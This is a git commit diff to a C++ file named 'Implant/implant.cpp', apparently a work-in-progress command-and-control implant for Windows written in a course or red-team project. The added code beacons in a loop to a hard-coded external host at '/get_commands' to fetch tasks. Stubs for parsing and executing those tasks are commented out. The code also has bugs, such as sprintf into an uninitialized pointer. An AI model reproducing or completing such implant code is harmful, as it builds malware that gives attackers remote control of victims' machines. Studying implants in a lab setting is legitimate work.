240effa0d054c883f6530e0a23795bd7a6ef7223
Catherine <quachcat@bu.edu>
2022-12-06 19:30:19 -0500

    work in progress: get task from an endpoint (needs to be tested)

--- Implant/implant.cpp
+++ Implant/implant.cpp
@@ -90,40 +90,21 @@ LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
 }
 
 
-//TODO
-auto getTasks(){
 
-return 1;
-}
 
 
 //TODO
-auto parseTasks(auto toParse){
+// auto parseTasks(auto toParse){
 
-return 1;
-}
+// return 1;
+// }
 
 //TODO
-auto executeTasks(auto tasks){
+// auto executeTasks(auto tasks){
     
-    return 1;
-}
+//     return 1;
+// }
 
-void runLoop(bool isRunning){
-    while (isRunning) {
-        try {
-            const auto serverResponse = std::async(std::launch::async, getTasks);
-            auto parsedTasks = parseTasks(serverResponse.get());
-            auto success = executeTasks(parsedTasks);
-        }
-        catch (const std::exception& e) {
-            printf("\nError in runLoop: %s\n", e.what());
-        }
-
-        //SET SLEEP HERE 
-    }
-
-}
 
 LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
 {
@@ -152,7 +133,15 @@ LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *post
                 WINHTTP_DEFAULT_ACCEPT_TYPES,
                 WINHTTP_FLAG_SECURE);
             if (request != NULL)
-            {
+            {   
+                /*
+                THIS IS A TESTING METHOD IMPLEMENTING FOR US TO GET HEADER*/
+                
+                if(WinHttpAddRequestHeaders(request, L"\"Content-Type\": \"application/json\"", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)){
+                    printf("YOU SET HEADER");
+                }
+
+                /*END OF TEST*/
                 BOOL idrequest = WinHttpSendRequest(
                     request,
                     WINHTTP_NO_ADDITIONAL_HEADERS,
@@ -194,6 +183,46 @@ LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *post
             }
         }
     }
+}
+
+char* getData(){
+    int num = 1;
+    char* results;
+    sprintf(results,"\{\"id\": %d \}",num);
+
+    return results;
+}
+//TODO
+LPSTR getTasks(void){
+    std::string fqdn = "walrus-app-tj8x9.ondigitalocean.app";
+    std::wstring fqdn_wstring(fqdn.begin(), fqdn.end());
+    LPCWSTR servername = fqdn_wstring.c_str();
+
+    std::string fqdn2 = "/get_commands";
+    std::wstring fqdn_wstring2(fqdn2.begin(), fqdn2.end());
+    LPCWSTR subdirectory = fqdn_wstring2.c_str();
+
+    const char* postdata = getData();
+    // const char* postdata = getData();
+    LPSTR item = makePostRequest(servername, subdirectory, postdata);
+
+    return item;
+}
+void runLoop(bool isRunning){
+    while (isRunning) {
+        try {
+            LPSTR getting = getTasks();
+            //const auto serverResponse = std::async(std::launch::async, getTasks);
+            //auto parsedTasks = parseTasks(serverResponse.get());
+            //auto success = executeTasks(parsedTasks);
+        }
+        catch (const std::exception& e) {
+            printf("\nError in runLoop: %s\n", e.what());
+        }
+
+        //SET SLEEP HERE 
+    }
+
 }
 
 int sendresults()
